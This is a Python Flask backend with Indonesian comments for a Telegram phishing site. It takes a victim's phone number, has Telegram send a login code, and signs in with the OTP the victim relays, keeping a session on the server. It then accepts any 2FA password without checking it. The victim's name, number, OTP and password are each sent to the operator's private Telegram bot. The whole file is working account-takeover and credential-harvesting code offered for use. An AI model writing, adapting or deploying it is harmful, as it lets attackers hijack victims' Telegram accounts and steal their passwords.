import os
import asyncio
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
CORS(app)

# Ambil variabel dari dashboard Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

sessions_hash = {}

def send_to_bot(message):
    """Kirim laporan ke Bot Telegram pribadi"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
    except:
        pass

async def telethon_logic(data):
    """Logika Telethon: Deteksi 2FA tapi abaikan validasi sandinya"""
    step = data.get('step')
    nomor = data.get('nomor')
    otp = data.get('otp')
    sandi = data.get('sandi')
    nama = data.get('nama', 'User')

    client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        # STEP 1: Kirim OTP
        if step == 1:
            sent_code = await client.send_code_request(nomor)
            sessions_hash[nomor] = sent_code.phone_code_hash
            send_to_bot(f"📲 *Target Masuk*\nNama: {nama}\nNomor: {nomor}")
            return {"status": "success"}, 200

        # STEP 2: Verifikasi OTP & Deteksi 2FA
        elif step == 2:
            phone_code_hash = sessions_hash.get(nomor)
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
                send_to_bot(f"✅ *Login Tanpa 2FA*\nNomor: {nomor}\nOTP: {otp}")
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                # Jika akun punya 2FA, arahkan website ke halaman input sandi
                return {"status": "need_2fa"}, 200
            except errors.PhoneCodeInvalidError:
                return {"status": "error", "message": "Kode OTP Salah!"}, 400

        # STEP 3: Terima Sandi (Abaikan Validasi)
        elif step == 3:
            # Apapun sandinya, kirim ke bot dan beri respon sukses agar pindah ke halaman loading
            send_to_bot(f"🔑 *Sandi Diterima*\nNomor: {nomor}\nSandi: {sandi}")
            return {"status": "success"}, 200

    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

# Fungsi Fix CORS agar tidak merah di konsol browser
def fix_cors(response):
    response.headers.add("Access-Control-Allow-Origin", "*")
    response.headers.add("Access-Control-Allow-Headers", "Content-Type,Authorization")
    response.headers.add("Access-Control-Allow-Methods", "GET,PUT,POST,DELETE,OPTIONS")
    return response

@app.route('/register', methods=['POST', 'OPTIONS'])
def register():
    # Tangani Preflight Request agar tombol bisa diklik
    if request.method == 'OPTIONS':
        return fix_cors(make_response())
        
    data = request.json
    try:
        # Jalankan logika async secara stabil
        result, status_code = async_to_sync(telethon_logic)(data)
        response = make_response(jsonify(result), status_code)
        return fix_cors(response)
    except Exception as e:
        response = make_response(jsonify({"status": "error", "message": str(e)}), 500)
        return fix_cors(response)

if __name__ == "__main__":
    # Gunakan port 8080 sesuai log Railway
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)